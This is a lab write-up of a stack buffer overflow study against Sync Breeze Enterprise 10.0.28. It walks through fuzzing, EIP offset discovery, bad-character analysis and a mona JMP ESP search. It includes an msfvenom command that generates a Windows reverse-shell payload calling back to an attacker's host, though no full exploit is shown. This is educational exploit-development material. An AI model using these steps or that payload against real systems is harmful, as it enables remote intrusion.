# Sync Breeze Enterprise 10.0.28 - Buffer Overflow Research

## Objective

Study of a classic stack-based buffer overflow vulnerability
in a controlled lab environment for educational purposes.

The objective of this project was to better understand:

- Application fuzzing
- Crash analysis
- EIP control
- Bad character identification
- Memory corruption
- Shellcode execution flow
- Basic exploit development methodology

---

## Environment

- Windows 10 Virtual Machine
- Sync Breeze Enterprise 10.0.28
- Immunity Debugger
- Mona.py
- Python

---

## Methodology

### 1. Information Gathering

A controlled lab environment was created using the same vulnerable
software version. Debugging tools were configured to analyze the
application behavior during runtime.

---

### 2. Fuzzing

Large sequences of bytes were sent to the application in order to
identify the approximate buffer size required to trigger a crash.

---

### 3. Vulnerability Validation

After identifying the crash threshold, the application was tested
again using the discovered payload size to confirm the vulnerability.

---

### 4. EIP Control

The exact offset required to overwrite the Instruction Pointer (EIP)
was identified.

Generate a unique pattern:

```bash
/usr/bin/msf-pattern_create -l <SIZE>
```

Identify the offset:

```bash
/usr/bin/msf-pattern_offset -l <SIZE> -q <EIP_VALUE>
```

Where:
- `<SIZE>` = payload length discovered during fuzzing
- `<EIP_VALUE>` = 4-byte value observed overwriting EIP

---

### 5. Bad Character Analysis

Bad characters were identified to determine which bytes could not be
safely processed by the application.

---

### 6. Return Address Identification

A suitable `JMP ESP` instruction was located in a module without ASLR
enabled.

Enumerating loaded modules:

```bash
!mona modules
```

Searching for `JMP ESP`:

```bash
!mona find -s "\xff\xe4" -m <MODULE_NAME>
```

Preference was given to application-specific DLLs due to the presence
of static memory addresses.

---

### 7. Execution Testing

Payload execution flow was validated to ensure correct redirection
to the controlled buffer.

---

### 8. Shellcode Generation

Shellcode was generated excluding previously identified bad characters.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<PORT> EXITFUNC=thread -b "BAD_CHARS" -f c
```

A NOP sled (`\x90`) was added before the shellcode to improve payload
execution reliability.

---

### 9. Final Exploit Development

The final exploit was assembled and tested successfully inside the
isolated lab environment.

---

## Disclaimer

This project was developed strictly for educational and research
purposes inside an isolated laboratory environment.
